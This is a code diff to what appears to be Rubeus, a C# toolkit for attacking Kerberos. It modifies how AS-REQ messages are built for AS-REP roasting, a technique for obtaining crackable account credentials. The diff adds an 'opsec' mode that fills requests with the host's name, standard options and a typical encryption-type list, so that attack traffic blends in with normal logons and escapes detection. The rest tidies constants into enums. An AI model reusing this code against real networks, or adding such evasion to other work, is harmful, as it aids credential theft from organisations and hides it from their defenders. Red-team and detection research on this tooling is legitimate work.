@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Net;
 using System.Security.Cryptography.X509Certificates;
 
 namespace Rubeus
@@ -19,12 +20,12 @@ namespace Rubeus
     
     public class AS_REQ
     {
-        public static AS_REQ NewASReq(string userName, string domain, Interop.KERB_ETYPE etype)
+        public static AS_REQ NewASReq(string userName, string domain, Interop.KERB_ETYPE etype, bool opsec = false)
         {
             // build a new AS-REQ for the given userName, domain, and etype, but no PA-ENC-TIMESTAMP
             //  used for AS-REP-roasting
 
-            AS_REQ req = new AS_REQ();
+            AS_REQ req = new AS_REQ(opsec);
 
             // set the username to roast
             req.req_body.cname.name_string.Add(userName);
@@ -34,23 +35,42 @@ namespace Rubeus
 
             // KRB_NT_SRV_INST = 2
             //      service and other unique instance (krbtgt)
-            req.req_body.sname.name_type = 2;
+            req.req_body.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;
             req.req_body.sname.name_string.Add("krbtgt");
             req.req_body.sname.name_string.Add(domain);
 
-            // add in our encryption type
-            req.req_body.etypes.Add(etype);
+            // try to build a realistic request
+            if (opsec)
+            {
+                string hostName = Dns.GetHostName();
+                List<HostAddress> addresses = new List<HostAddress>();
+                addresses.Add(new HostAddress(hostName));
+                req.req_body.addresses = addresses;
+                req.req_body.kdcOptions = req.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac_exp);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.old_exp);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.des_cbc_md5);
+
+            }
+            else
+            {
+                // add in our encryption type
+                req.req_body.etypes.Add(etype);
+            }
 
             return req;
         }
 
-        public static AS_REQ NewASReq(string userName, string domain, string keyString, Interop.KERB_ETYPE etype)
+        public static AS_REQ NewASReq(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, bool opsec = false)
         {
             // build a new AS-REQ for the given userName, domain, and etype, w/ PA-ENC-TIMESTAMP
             //  used for "legit" AS-REQs w/ pre-auth
 
             // set pre-auth
-            AS_REQ req = new AS_REQ(keyString, etype);
+            AS_REQ req = new AS_REQ(keyString, etype, opsec);
             
             // req.padata.Add()
 
@@ -62,12 +82,30 @@ namespace Rubeus
 
             // KRB_NT_SRV_INST = 2
             //      service and other unique instance (krbtgt)
-            req.req_body.sname.name_type = 2;
+            req.req_body.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;
             req.req_body.sname.name_string.Add("krbtgt");
             req.req_body.sname.name_string.Add(domain);
 
-            // add in our encryption type
-            req.req_body.etypes.Add(etype);
+            // try to build a realistic request
+            if (opsec)
+            {
+                string hostName = Dns.GetHostName();
+                List<HostAddress> addresses = new List<HostAddress>();
+                addresses.Add(new HostAddress(hostName));
+                req.req_body.addresses = addresses;
+                req.req_body.kdcOptions = req.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac_exp);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.old_exp);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.des_cbc_md5);
+            }
+            else
+            {
+                // add in our encryption type
+                req.req_body.etypes.Add(etype);
+            }
 
             return req; 
         }
@@ -91,7 +129,7 @@ namespace Rubeus
 
             // KRB_NT_SRV_INST = 2
             //      service and other unique instance (krbtgt)
-            req.req_body.sname.name_type = 2;
+            req.req_body.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;
             req.req_body.sname.name_string.Add("krbtgt");
             req.req_body.sname.name_string.Add(domain);
 
@@ -101,23 +139,23 @@ namespace Rubeus
             return req;
         }
 
-        public AS_REQ()
+        public AS_REQ(bool opsec = false)
         {
             // default, for creation
             pvno = 5;
-            msg_type = 10;
+            msg_type = (long)Interop.KERB_MESSAGE_TYPE.AS_REQ;
 
             padata = new List<PA_DATA>();
             padata.Add(new PA_DATA());
 
-            req_body = new KDCReqBody();
+            req_body = new KDCReqBody(true, opsec);
         }
 
-        public AS_REQ(string keyString, Interop.KERB_ETYPE etype)
+        public AS_REQ(string keyString, Interop.KERB_ETYPE etype, bool opsec = false)
         {
             // default, for creation
             pvno = 5;
-            msg_type = 10;
+            msg_type = (long)Interop.KERB_MESSAGE_TYPE.AS_REQ;
 
             padata = new List<PA_DATA>();
             
@@ -127,7 +165,7 @@ namespace Rubeus
             // add the include-pac == true
             padata.Add(new PA_DATA());
             
-            req_body = new KDCReqBody();
+            req_body = new KDCReqBody(true, opsec);
 
             this.keyString = keyString;
         }
@@ -160,7 +198,7 @@ namespace Rubeus
             //  tag class == 1
             //  tag class == 10
             //  SEQUENCE
-            if (asn_AS_REQ.TagValue != 10)
+            if (asn_AS_REQ.TagValue != (int)Interop.KERB_MESSAGE_TYPE.AS_REQ)
             {
                 throw new System.Exception("AS-REQ tag value should be 10");
             }
